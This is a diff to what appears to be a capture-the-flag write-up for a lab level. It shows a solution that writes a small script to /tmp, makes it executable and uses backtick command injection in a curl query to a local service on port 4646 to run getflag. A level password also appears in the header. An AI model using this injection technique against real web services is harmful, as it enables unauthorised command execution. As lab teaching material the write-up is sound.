@@ -16,8 +16,8 @@ pass : fa6v5ateaw21peobuub8ipe6s
 
 ## Solution
 ```bash
-vi /tmp/MAJFILE #put the content of majfile.sh
-chmod 777 /tmp/MAJFILE
+echo "getflag > /tmp/newFile" > /tmp/GETFLAG
+chmod 777 /tmp/GETFLAG
 curl localhost:4646?x=\`/*/GETFLAG\`
 cat /tmp/newFile #let's go
 ```
